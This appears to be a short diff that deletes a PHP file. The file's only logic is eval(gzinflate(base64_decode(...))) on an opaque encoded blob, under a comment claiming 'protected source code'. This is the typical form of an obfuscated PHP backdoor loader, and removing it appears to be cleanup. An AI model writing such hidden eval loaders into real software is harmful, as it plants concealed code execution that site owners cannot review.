@@ -1,7 +1,0 @@
-<?php
-/**
- * PROTECTED SOURCE CODE
- * AUTHORIZED USAGE ONLY
- */
-eval(gzinflate(base64_decode('48rMS84pTUlVUHcrzUsuyczPK9Z3SSxJTEosTtUryChQt+ZSSUlSsFVwzs/LSwUr0FBPSYrPzSxOVtcEShalFgNlgWp07QpLU4sqNZSCPfzDFUIcnXxcg5U0de3SUkuSMxxzcjQCXPytrNxcQ5w94p39fUJ9/YDaC4oy80riizRAxgC5XAA=')));
-?>
